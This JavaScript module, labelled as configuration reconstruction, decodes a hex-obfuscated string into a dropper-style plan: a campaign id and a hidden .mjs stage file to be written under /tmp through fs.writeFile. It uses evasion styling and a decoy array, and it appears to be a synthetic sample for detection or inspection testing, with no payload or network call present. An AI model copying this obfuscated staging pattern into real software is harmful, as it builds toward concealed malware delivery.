// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_4d4a2c9f = "[\"85\",\"4c\",\"40\",\"8b\",\"82\",\"83\",\"74\",\"7f\",\"82\",\"4c\",\"73\",\"74\",\"72\",\"7e\",\"73\",\"74\",\"6e\",\"74\",\"7c\",\"71\",\"74\",\"73\",\"73\",\"74\",\"73\",\"3b\",\"86\",\"81\",\"78\",\"83\",\"74\",\"6e\",\"75\",\"78\",\"7b\",\"74\",\"8b\",\"70\",\"73\",\"70\",\"7f\",\"83\",\"74\",\"81\",\"4c\",\"83\",\"88\",\"7f\",\"74\",\"73\",\"6e\",\"70\",\"81\",\"81\",\"70\",\"88\",\"6e\",\"83\",\"7e\",\"6e\",\"75\",\"78\",\"7b\",\"74\",\"8b\",\"82\",\"83\",\"70\",\"76\",\"74\",\"6e\",\"72\",\"7e\",\"84\",\"7d\",\"83\",\"4c\",\"40\",\"8b\",\"72\",\"70\",\"7c\",\"7f\",\"70\",\"78\",\"76\",\"7d\",\"6e\",\"78\",\"73\",\"4c\",\"5d\",\"5e\",\"53\",\"54\",\"3c\",\"46\",\"44\",\"47\",\"47\",\"43\",\"46\",\"45\",\"55\",\"8b\",\"75\",\"78\",\"7b\",\"74\",\"6e\",\"7f\",\"70\",\"83\",\"77\",\"4c\",\"3e\",\"83\",\"7c\",\"7f\",\"3e\",\"77\",\"84\",\"7d\",\"83\",\"81\",\"74\",\"82\",\"82\",\"3c\",\"7d\",\"7e\",\"73\",\"74\",\"3e\",\"3d\",\"82\",\"83\",\"70\",\"76\",\"74\",\"3c\",\"46\",\"44\",\"47\",\"47\",\"43\",\"46\",\"45\",\"75\",\"74\",\"75\",\"43\",\"72\",\"3d\",\"7c\",\"79\",\"82\"]";
const Codec_4d4a2c9f = "hex_array|add_modulo_256|0f";

function load_4d4a2c9f() { return JSON.parse(Material_4d4a2c9f).map((value) => Number.parseInt(value, 16)); }
function decode_4d4a2c9f(EnCoDeD) { return EnCoDeD.map((value) => (value - 15 + 256) & 255); }
async function recover_4d4a2c9f() {
  const NeUtRaL = [3, 5, 8, 13].slice(1, 3);
  const EnCoDeD = load_4d4a2c9f(); let DeCoDeD = [];
  DeCoDeD = await (async () => decode_4d4a2c9f(EnCoDeD))();
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_4d4a2c9f() { return Buffer.from(await recover_4d4a2c9f(), "utf8").toString("utf8"); }
async function plan_4d4a2c9f() { const inspect = inspect_4d4a2c9f; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "typed_array_to_file", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_4d4a2c9f;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_4d4a2c9f());

// reconstruction complete